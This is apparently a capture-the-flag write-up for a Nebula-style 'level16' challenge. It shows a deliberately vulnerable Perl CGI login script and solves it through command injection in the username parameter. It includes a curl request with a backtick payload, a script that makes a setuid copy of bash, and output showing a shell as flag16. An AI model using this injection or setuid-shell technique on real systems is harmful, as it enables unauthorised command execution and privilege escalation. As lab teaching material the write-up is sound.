# level16

## Challenge info

There is a perl script running on port 1616. <br>

To do this level, log in as the level16 account with the password level16. Files for this level can be found in /home/flag16. <br>

```
#!/usr/bin/env perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space

  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
  foreach $line (@output) {
      ($usr, $pw) = split(/:/, $line);
  

      if($pw =~ $password) {
          return 1;
      }
  }

  return 0;
}

sub htmlz {
  print("<html><head><title>Login resuls</title></head><body>");
  if($_[0] == 1) {
      print("Your login was accepted<br/>");
  } else {
      print("Your login failed<br/>");
  }    
  print("Would you like a cookie?<br/><br/></body></html>\n");
}

htmlz(login(param("username"), param("password")));
```


## Solution

I went ahead and checked the file <b> thttpd.conf </b> and the lines below catched my attention

```
# Specifies a wildcard pattern for CGI programs, for instance "**.cgi" or
# "/cgi-bin/*". See thttpd(8) for details.
cgipat=**.cgi
```

With further search, did not found any vulnerability related to this <br>

One thing that i did not knew is that it is possible to execute commands as such
```
file path: /tmp/FOO

cmd: /*/FOO <- Executes foo if no
```

That command (to execute FOO), already satisfies both regexes
```
$username =~ tr/a-z/A-Z/; # conver to uppercase
$username =~ s/\s.*//;        # strip everything after a space
```

Now, and since the script will run a command line (as shown below), when the username is used it will execute the program
```
@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
```

Lets create a simple bash script that copies the bash binary with flag16 perms and +s flag
```
#!/bin/bash

cp /bin/bash /tmp/owned
chmod +s /tmp/owned
```

Now for the command to execute we need to wrap the command in <b>`</b> ...
```
Injection: `/*/WAZA`
Request: curl "http://IP_VM:1616/login.cgi?username=`/*/WAZA`&password=owned"

Cmd (VM): ls -la /tmp

-rwsr-sr-x 1 flag16  flag16  916692 2020-12-11 09:58 owned

cmd (VM): /tmp/owned -p
cmd (VM): whoami && id

flag16
uid=983(flag16) gid=983(flag16) groups=983(flag16)
```

Disclaimer: the fucking bash cp was not working for some stupid reason, reverse shell it and done <br>
## Flag

```
You have successfully executed getflag on a target account
```

